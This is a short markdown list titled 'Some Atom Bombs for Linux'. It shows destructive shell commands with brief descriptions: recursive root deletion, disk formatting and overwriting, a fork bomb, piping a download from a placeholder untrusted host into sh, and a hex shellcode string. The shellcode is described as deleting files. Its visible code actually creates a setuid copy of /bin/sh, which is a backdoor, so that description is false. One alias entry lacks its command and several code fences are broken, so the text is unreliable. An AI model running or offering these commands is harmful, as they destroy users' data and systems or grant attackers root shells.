## Some Atom Bombs for Linux

```
sudo rm -rf /
sudo umount /
```

This command will delete your entire files on mounted devices!

```

This command will set alias cd as rm -rf in every new terminal instance.

```
mkfs.ext3 /dev/sda

This command will format your /dev/sda device and ofcourse will delete all files on it.

```
:(){:|:&};:

This command will run too many processes on your system and causes the computer hang up!

```
wget http://sumber_tak_terpercaya -O- | sh

This command will download a shell script from untrusted source and run it when the download finished

```
mv ~/* /dev/null
```
This will move home directory to a place that actually doesn't exist. In other words, it will delete your home directory


```
char esp[] __attribute__ ((section(".text"))) /* e.s.p
release */
= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
"cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;";
```
Hexadecimal code! Same as the first command, it will delete entire files on your mounted devices


```bash
dd if=/dev/zero of=/dev/sda bs=1M count=1
```
Copilot Suggested this Have not tried yet

```
dd if=/dev/zero of=~/.config/alacritty/alacritty.yml bs=1G count=1024
```
Creates a 1TB file at config/alacritty/alacritty.yml
